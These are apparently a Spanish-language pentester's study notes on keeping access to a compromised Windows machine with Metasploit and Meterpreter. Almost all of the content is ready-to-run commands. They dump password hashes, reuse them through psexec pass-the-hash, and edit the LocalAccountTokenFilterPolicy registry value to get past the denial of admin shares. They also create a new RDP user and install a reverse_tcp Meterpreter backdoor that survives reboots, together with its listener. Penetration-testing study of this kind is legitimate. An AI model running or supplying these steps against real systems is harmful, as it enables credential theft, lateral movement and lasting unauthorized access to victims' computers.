- Persistencia

Se puede hacer mediante servicios de acceso remoto o mediante backdoors, creando nuevos usuarios, editando servicios o instalando nuevas vulnerabilidades en el sistema.

**UNA VEZ OBTENIDA SESIÓN CON PRIVILEGIOS**

- **PSEXEC PASS THE HASH**

Primero migramos a un proceso más estable.

```
getpid #para ver proceso de nuestro meterpreter
ps #para ver todos los procesos e identificarlo
migrate pid #svchost por ejemplo
```

Ahora sacamos los hashes de las contraseñas de los users. Podríamos sacar contraseñas de servicios, usuarios, y luego hacer pass the hash, o crackearlos. En este caso probamos pass the hash.

```
hashdump #y copiarlo como sale el output a un archivo.
```

ó

```
run post/windows/gather/smart_hashdump
background
creds #saca las credenciales conseguidas con smart_hashdump que se encuentren en la base de datos.
```

PARA HACER EL PASS THE HASH PODEMOS USAR PSEXEC o el módulo de psexec de metasploit.

```
use exploit/windows/smb/psexec
options
set rhost IPobj
set smbuser x
set smbpass x #(del mismo user, probar el hash)
exploit
```

Si nos da el error STATUS_ACCESS_DENIED quiere decir que no tenemos acceso a SHARES DE ADMINISTRADOR.

Volvemos a la sesión anterior de meterpreter e introducimos este comando

```
reg setval -k 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -v LocalAccountTokenFilterPolicy -t REG_DWORD -d 1

background
```

Lanzamos otra vez el exploit de psexec y ya tenemos persistencia con ese usuario.

- **Persistencia via RDP (necesita pass en texto plano)**

Si no conseguimos crackear los hashes o sacar las pass con mimikatz, podemos añadir un nuevo usuario.

En meterpreter:

```
run getgui -e -u usernuevo -p passusernuevo #activamos rdp y creamos un usuario
EN OTRA SHELL: xfreerdp /v:IPobj /u:usernuevo /p:passusernuevo
```

- **PERSISTENCIA CON BACKDOOR (Metasploit)**

Hacemos lo siguiente:

```
background #sesion de metasploit
search persistence #tenemos varios modulos
use exploit/windows/local/persistence
options
set session nº #la que sea del pc víctima
set STARTUP SYSTEM
set payload windows/meterpreter/reverse_tcp
set LHOST IPkali
set LPORT random #en pentest real usar 80 y 443
exploit

```

El backdoor va a funcionar aunque se reinicie el ordenador.

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost eldelbackdoor
set lport eldelbackdoor
run
```

